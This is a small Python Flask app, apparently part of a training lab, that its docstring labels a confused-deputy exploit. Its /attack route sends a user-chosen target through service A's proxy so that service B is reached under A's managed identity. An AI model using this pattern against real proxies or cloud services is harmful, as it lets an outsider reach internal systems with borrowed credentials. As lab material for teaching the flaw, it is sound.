"""Confused Deputy — exploit svc-a's proxy to access svc-b with managed identity."""
import os, urllib.request
from flask import Flask, request, render_template_string

app = Flask(__name__)
SVC_A = os.environ.get("SVC_A_URL","http://svc-a:5000")

HTML="""<!DOCTYPE html><html><head><title>Service Proxy</title></head><body>
<h1>Service A Proxy Console</h1>
<p>Service A provides proxied access to internal services.</p>
<form method=get action=/attack>
<label>Target host:port: <input name=target placeholder="e.g. svc-b:5000"></label>
<button>Proxy Request</button></form><pre>{{output}}</pre></body></html>"""

@app.route("/")
def home(): return render_template_string(HTML,output="Ready — enter a target to proxy through svc-a")

@app.route("/attack")
def attack():
    target=request.args.get("target","")
    if not target:
        return render_template_string(HTML,output="Error: target parameter required")
    try:
        r=urllib.request.urlopen(f"{SVC_A}/proxy?to={target}",timeout=5)
        return render_template_string(HTML,output=f"[+] Deputy proxy response:\n{r.read().decode()}")
    except Exception as e: return render_template_string(HTML,output=f"[-] Error: {e}")

if __name__=="__main__": app.run(host="0.0.0.0",port=5000)
